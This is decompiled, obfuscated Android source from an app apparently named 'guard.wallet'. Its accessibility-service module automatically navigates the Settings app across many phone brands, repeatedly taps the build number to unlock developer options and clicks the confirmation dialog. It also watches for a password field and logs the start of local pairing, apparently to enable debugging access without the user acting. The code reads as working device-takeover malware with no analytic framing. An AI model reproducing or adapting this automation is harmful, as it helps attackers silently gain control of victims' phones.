package o;

import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class t extends e {
   public final ScheduledExecutorService n;
   public final AtomicReference o;
   public final ReentrantLock p;

   public t() {
      super(X(), "com.android.settings");
      ScheduledExecutorService var1 = Executors.newSingleThreadScheduledExecutor();
      this.n = var1;
      this.o = new AtomicReference<>(r.f.b);
      this.p = new ReentrantLock();

      try {
         s var2 = new s(this, 8);
         var1.schedule(var2, 100L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("OpenDevelopmentDelegate", var3);
      }
   }

   public static CombineFilter L() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      BoolCondition var1 = new BoolCondition("clickable", true, true);
      var0.getBoolConditions().add(var1);
      return var0;
   }

   public static ListenWindow M() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "android.app.AlertDialog");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      return var0;
   }

   public static ListenWindow N() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow O() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DeviceInfoSettingsActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter V() {
      String var1 = com.guard.wallet.utils.f.b("MOTO_OS_VERSION_INFO_TEXT");
      if (!a1.q.B(var1)) {
         CombineFilter var0 = new CombineFilter();
         StringCondition var2 = a.a.b(var0, a.a.c(var0, "className", "android.widget.TextView"), "text", var1);
         var0.getStringConditions().add(var2);
         return var0;
      } else {
         return null;
      }
   }

   public static ListenWindow W() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.Settings$MyDeviceInfoActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static LinkedList X() {
      LinkedList var0 = new LinkedList();
      var0.add(W());
      var0.add(O());
      var0.add(N());
      var0.add(f0());
      var0.add(d0());
      var0.add(g0());
      var0.add(M());
      var0.addAll(o.i.L());
      var0.add(a0.Y());
      var0.add(a0.W());
      var0.add(a0.s0());
      var0.add(a0.P0());
      var0.add(a0.O0());
      var0.add(a0.j0());
      var0.add(a0.i0());
      return var0;
   }

   public static CombineFiltersWithOr Y() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr();
      var3.setFilters(new LinkedList<>());
      String var4 = com.guard.wallet.utils.f.b("BUILD_VERSION_TEXT");
      boolean var0 = a1.q.B(var4);
      Object var2 = null;
      CombineFilter var1;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var16 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var16);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("BUILD_NUMBER_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var18 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var18);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("OS_VERSION_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var20 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var20);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("COLORS_BUILD_NUMBER_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var22 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var22);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("OS_SOFTWARE_VERSION_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var24 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var24);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("MIUI_VERSION_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var26 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var26);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("HYPER_OS_VERSION_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var28 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var28);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("VIVO_OS_SOFTWARE_VERSION_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var30 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var30);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("COMPILE_NUMBER_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var32 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var32);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("HUA_WEI_VERSION_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var34 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var34);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("HARMONY_OS_VERSION_TEXT");
      var1 = (CombineFilter)var2;
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         var2 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add((StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return var3;
   }

   public static boolean a0() {
      if (MyAccessibilityService.P() != null && !MyAccessibilityService.P().p()) {
         MyAccessibilityService.P().e();
         com.guard.wallet.utils.g.T0(10);
         return com.guard.wallet.utils.g.f1();
      } else {
         return false;
      }
   }

   public static ListenWindow d0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      return var0;
   }

   public static CombineFiltersWithOr e0() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr();
      var3.setFilters(new LinkedList<>());
      String var4 = com.guard.wallet.utils.f.b("OS_VERSION_INFO_TEXT");
      boolean var0 = a1.q.B(var4);
      Object var2 = null;
      CombineFilter var1;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var8 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var8);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("VIVO_OS_VERSION_INFO_TEXT");
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         StringCondition var10 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add(var10);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var4 = com.guard.wallet.utils.f.b("SOFTWARE_INFO_TEXT");
      var1 = (CombineFilter)var2;
      if (!a1.q.B(var4)) {
         var1 = new CombineFilter();
         var2 = a.a.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text", var4);
         var1.getStringConditions().add((StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return var3;
   }

   public static ListenWindow f0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.vivo.settings.deviceinfo.OriginDeviceSettingsActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow g0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.vivo.settings.VivoSubSettings");
      var0.setMatchs(new LinkedList<>());
      var0.setEventTypes(new HashSet<>());
      o.b.q(32, var0.getEventTypes(), var0).add(16384);
      return var0;
   }

   public final boolean H() {
      LinkedList var1 = new LinkedList();
      var1.add(W());
      var1.add(O());
      var1.add(N());
      var1.add(f0());
      return this.q(var1);
   }

   public final boolean I() {
      boolean var2 = this.q(o.i.L());
      boolean var1 = true;
      if (var2) {
         return true;
      } else if (!Objects.equals((String)MyAccessibilityService.v.get(), "android.inputmethodservice.SoftInputWindow")) {
         return false;
      } else {
         UiObject var3 = MyAccessibilityService.P().J();
         if (var3 == null || !var3.password()) {
            var1 = false;
         }

         return var1;
      }
   }

   public final boolean J() {
      LinkedList var1 = new LinkedList();
      var1.add(a0.Y());
      var1.add(a0.W());
      var1.add(a0.s0());
      var1.add(a0.P0());
      var1.add(a0.O0());
      var1.add(a0.j0());
      var1.add(a0.i0());
      return this.q(var1);
   }

   public final boolean K() {
      boolean var1 = this.I();
      AtomicReference var3 = this.o;
      if (var1) {
         var3.set(r.f.f);
         if (this.I()) {
            var3.set(r.f.g);
         }

         return true;
      } else {
         var1 = com.guard.wallet.utils.g.K();
         r.f var2 = r.f.i;
         if (!var1 && !this.J()) {
            return false;
         } else {
            var3.set(var2);
            this.T();
            return true;
         }
      }
   }

   public final UiObject P() {
      CombineFiltersWithOr var1 = new CombineFiltersWithOr();
      var1.setFilters(new LinkedList<>());
      List var2 = var1.getFilters();
      CombineFilter var4 = new CombineFilter();
      StringCondition var3 = a.a.c(var4, "className", "androidx.recyclerview.widget.RecyclerView");
      var4.getStringConditions().add(var3);
      var2.add(var4);
      var2 = var1.getFilters();
      var4 = new CombineFilter();
      var3 = a.a.c(var4, "className", "android.widget.ScrollView");
      var4.getStringConditions().add(var3);
      var2.add(var4);
      var2 = var1.getFilters();
      CombineFilter var10 = new CombineFilter();
      var10.setStringConditions(new LinkedList<>());
      var10.setBoolConditions(new LinkedList<>());
      StringCondition var13 = new StringCondition();
      var13.setProperty("className");
      var13.setEquals("android.widget.ListView");
      var10.getStringConditions().add(var13);
      BoolCondition var14 = new BoolCondition("scrollable", true, true);
      var10.getBoolConditions().add(var14);
      var2.add(var10);
      List var15 = var1.getFilters();
      CombineFilter var11 = new CombineFilter();
      var11.setStringConditions(new LinkedList<>());
      var11.setBoolConditions(new LinkedList<>());
      BoolCondition var8 = new BoolCondition("scrollable", true, true);
      var11.getBoolConditions().add(var8);
      var15.add(var11);
      UiObject var5;
      if (this.k() != null) {
         var5 = this.k().findOneByOperateOr(var1);
      } else {
         var5 = null;
      }

      return var5;
   }

   public final void Q() {
      if (this.H()) {
         Log.d("OpenDevelopmentDelegate", "inAboutDeviceWin 窗口匹配");
         this.G();
         Log.d("OpenDevelopmentDelegate", "active root complete");
         StringBuilder var2 = new StringBuilder("开始本地配对时间戳:");
         var2.append(System.currentTimeMillis());
         Log.d("OpenDevelopmentDelegate", var2.toString());
         AtomicReference var7 = this.o;
         var7.set(r.f.c);
         boolean var1 = com.guard.wallet.utils.e.l();
         r.f var6 = r.f.d;
         Object var5 = null;
         UiObject var4 = null;
         if (var1 || com.guard.wallet.utils.e.i() || Build.BRAND.equalsIgnoreCase("samsung")) {
            UiObject var3;
            if (this.k() != null) {
               var3 = this.k().findOneByOperateOr(e0());
            } else {
               var3 = null;
            }

            UiObject var9 = var3;
            if (var3 == null) {
               UiObject var8 = this.P();
               var9 = var3;
               if (var8 != null) {
                  Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                  var3 = var8.scrollForwardUtil(new z.d(e0(), 1));
                  var9 = var3;
                  if (var3 == null) {
                     var9 = var8.scrollBackwardUtil(new z.d(e0(), 1));
                  }
               }
            }

            if (var9 != null) {
               if (!var9.clickable()) {
                  var9 = var9.findParentUtilCombine(L());
               }

               if (var9 != null && var9.click()) {
                  var7.set(var6);
                  com.guard.wallet.helper.g.h(5);
               }

               return;
            }
         }

         UiObject var14;
         if (this.k() != null) {
            var14 = this.k().findOneByOperateOr(Y());
         } else {
            var14 = null;
         }

         UiObject var10 = var14;
         if (var14 == null) {
            UiObject var21 = this.P();
            var10 = var14;
            if (var21 != null) {
               Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
               var14 = var21.scrollForwardUtil(new z.d(Y(), 1));
               var10 = var14;
               if (var14 == null) {
                  var10 = var21.scrollBackwardUtil(new z.d(Y(), 1));
               }
            }
         }

         if (var10 != null) {
            if (!var10.clickable()) {
               var10 = var10.findParentUtilCombine(L());
            }

            if (var10 != null && !this.Z(var10)) {
               this.S();
            }
         } else if (Build.BRAND.equalsIgnoreCase("motorola")) {
            var14 = var4;
            if (this.k() != null) {
               var14 = this.k().findOneByCombine(V());
            }

            UiObject var11 = var14;
            if (var14 == null) {
               var4 = this.P();
               var11 = var14;
               if (var4 != null) {
                  Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                  var11 = var4.scrollForwardUtil(new z.d(V(), 0));
                  if (var11 == null) {
                     var11 = var4.scrollBackwardUtil(new z.d(V(), 0));
                  }
               }
            }

            if (var11 != null) {
               if (!var11.clickable()) {
                  var11 = var11.findParentUtilCombine(L());
               }

               if (var11 != null && var11.click()) {
                  var7.set(var6);
               }
            }
         } else {
            var14 = (UiObject)var5;
            if (this.k() != null) {
               var14 = this.k().findOneByOperateOr(e0());
            }

            UiObject var12 = var14;
            if (var14 == null) {
               var4 = this.P();
               var12 = var14;
               if (var4 != null) {
                  Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                  var14 = var4.scrollForwardUtil(new z.d(e0(), 1));
                  var12 = var14;
                  if (var14 == null) {
                     var12 = var4.scrollBackwardUtil(new z.d(e0(), 1));
                  }
               }
            }

            if (var12 != null) {
               if (!var12.clickable()) {
                  var12 = var12.findParentUtilCombine(L());
               }

               if (var12 != null && var12.click()) {
                  var7.set(var6);
               }
            }
         }
      }
   }

   public final void R() {
      if (this.q(Collections.singletonList(M()))) {
         UiObject var3 = this.k();
         CombineFilter var5 = new CombineFilter();
         StringCondition var4 = a.a.b(var5, a.a.c(var5, "className", "android.widget.Button"), "id", "android:id/button1");
         var5.getStringConditions().add(var4);
         var3 = var3.findOneByCombine(var5);
         if (var3 != null && var3.click()) {
            com.guard.wallet.helper.g.h(9);
            Log.d("OpenDevelopmentDelegate", "已点击确认开启开发者选项");
            boolean var2 = com.guard.wallet.utils.g.K();
            AtomicReference var7 = this.o;
            boolean var1;
            if (!var2 && !this.J()) {
               if (a0()) {
                  var7.set(r.f.k);
               }

               var1 = false;
            } else {
               var1 = true;
            }

            if (var1) {
               var7.set(r.f.i);
               this.T();
            }
         }
      }
   }

   public final void S() {
      if (!com.guard.wallet.utils.g.K()) {
         this.c0();
         com.guard.wallet.utils.g.F0(2);
         com.guard.wallet.utils.g.T0(5);
         this.o.set(r.f.j);
         if (MyAccessibilityService.P() != null) {
            MyAccessibilityService.P().u();
            MyAccessibilityService.P().z();
            MyAccessibilityService.P().B();
            com.guard.wallet.helper.g.h(10);
         }

         com.guard.wallet.helper.g.c();
      } else {
         this.T();
      }
   }

   public final void T() {
      ReentrantLock var1 = this.p;
      if (var1.tryLock()) {
         this.c0();
         if (MyAccessibilityService.P() != null) {
            MyAccessibilityService.P().u();
            com.guard.wallet.helper.g.h(10);
         }

         if (a0()) {
            this.o.set(r.f.l);
         }

         var1.unlock();
      }
   }

   public final void U() {
      LinkedList var1 = new LinkedList();
      var1.add(d0());
      var1.add(g0());
      if (this.q(var1)) {
         Log.d("OpenDevelopmentDelegate", "inVersionInfoWin 窗口匹配");
         this.G();
         Log.d("OpenDevelopmentDelegate", "active root complete");
         this.o.set(r.f.e);
         if (this.k() != null) {
            UiObject var2 = this.k().findOneByOperateOr(Y());
            UiObject var4 = var2;
            if (var2 == null) {
               UiObject var3 = this.P();
               var4 = var2;
               if (var3 != null) {
                  Log.d("OpenDevelopmentDelegate", "inVersionInfoWin 滚动视图查找成功");
                  var2 = var3.scrollForwardUtil(new z.d(Y(), 1));
                  var4 = var2;
                  if (var2 == null) {
                     var4 = var3.scrollBackwardUtil(new z.d(Y(), 1));
                  }
               }
            }

            if (var4 != null) {
               if (!var4.clickable()) {
                  var4 = var4.findParentUtilCombine(L());
               }

               if (var4 != null && !this.Z(var4)) {
                  this.S();
               }
            }
         }
      }
   }

   public final boolean Z(UiObject var1) {
      boolean var2 = false;
      AtomicInteger var4 = new AtomicInteger(0);

      while (!var2 && var4.incrementAndGet() <= 5) {
         var1.repeatClick(7);
         com.guard.wallet.utils.g.T0(5);
         var2 = this.K();
      }

      boolean var3 = var2;
      if (!var2) {
         var3 = var2;
         if (MyAccessibilityService.P() != null) {
            if (!MyAccessibilityService.P().p()) {
               MyAccessibilityService.P().e();
               com.guard.wallet.utils.g.T0(10);
            }

            var3 = var2;
            if (com.guard.wallet.utils.g.f1()) {
               this.o.set(r.f.k);
               var3 = true;
            }
         }
      }

      return var3;
   }

   public final void b0() {
      this.c0();
      com.guard.wallet.utils.g.F0(2);
      com.guard.wallet.utils.g.T0(5);
      this.o.set(r.f.j);
      if (MyAccessibilityService.P() != null) {
         MyAccessibilityService.P().u();
         MyAccessibilityService.P().z();
         MyAccessibilityService.P().B();
         com.guard.wallet.helper.g.h(10);
      }

      com.guard.wallet.helper.g.c();
   }

   public final void c0() {
      try {
         this.n.shutdownNow();
         com.guard.wallet.thread.l.a(super.c);
         super.d();
      } catch (Exception var2) {
         a1.q.s("OpenDevelopmentDelegate", var2);
      }
   }

   @Override
   public final void d() {
      this.c0();
      super.d();
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof t;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(t.class.getName());
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      super.u(var1, var2, var3);
      AtomicReference var6 = this.o;
      int var4 = ((r.f)var6.get()).a;
      String var5 = super.c;
      if (var4 < 0) {
         com.guard.wallet.thread.l.c(new s(this, 0), var5);
      }

      if (((r.f)var6.get()).a < 2) {
         com.guard.wallet.thread.l.c(new s(this, 1), var5);
      }

      if (((r.f)var6.get()).a < 4) {
         com.guard.wallet.thread.l.c(new s(this, 2), var5);
      }

      if (((r.f)var6.get()).a <= 4) {
         com.guard.wallet.thread.l.c(new s(this, 3), var5);
      }

      if (var6.get() == r.f.g) {
         com.guard.wallet.thread.l.c(new s(this, 4), var5);
      }

      if (var6.get() == r.f.f || var6.get() == r.f.h) {
         com.guard.wallet.thread.l.c(new s(this, 5), var5);
      }

      if (var6.get() == r.f.k) {
         com.guard.wallet.thread.l.c(new s(this, 6), var5);
      }

      if (var6.get() == r.f.l) {
         com.guard.wallet.thread.l.c(new s(this, 7), var5);
      }
   }
}
